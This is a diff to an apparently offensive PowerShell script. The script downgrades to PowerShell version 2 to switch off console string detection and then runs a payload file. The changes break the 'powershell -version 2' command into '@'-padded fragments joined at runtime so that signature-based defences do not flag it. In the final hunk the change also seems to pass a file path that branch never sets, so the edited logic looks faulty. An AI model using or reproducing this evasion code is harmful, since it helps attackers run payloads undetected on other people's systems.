@@ -220,16 +220,20 @@ If($Technic -eq 1)
          write-host "  Report      : String detection disabled on console!"
          write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
          write-host "$FilePath`n" -ForegroundColor Green;
-         powershell -version 2 -file $FilePath
+
+         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
+         powershell -Command "$DownGradedPSesion"
       }
       ElseIf($PayloadUrl -ne "false")
       {
          $FilePath = $PayloadURL.Split('/')[-1]   # payload.ps1   
          write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
          write-host "  Report      : String detection disabled on console!"
-         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
-         write-host "$FilePath`n" -ForegroundColor Green;
-         powershell -version 2 -file $FilePath     
+         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
+         write-host "$FilePath`n" -ForegroundColor Green
+
+         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
+         powershell -Command "$DownGradedPSesion"
       }
       Else
       {
@@ -239,7 +243,9 @@ If($Technic -eq 1)
          write-host "  Remark      : Exec 'exit' to return to PS version ${returnversion}"
          write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
          write-host "powershell -version 2`n" -ForegroundColor Green;
-         powershell -version 2
+
+         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
+         powershell -Command "$DownGradedPSesion"
       }
    }
    Else
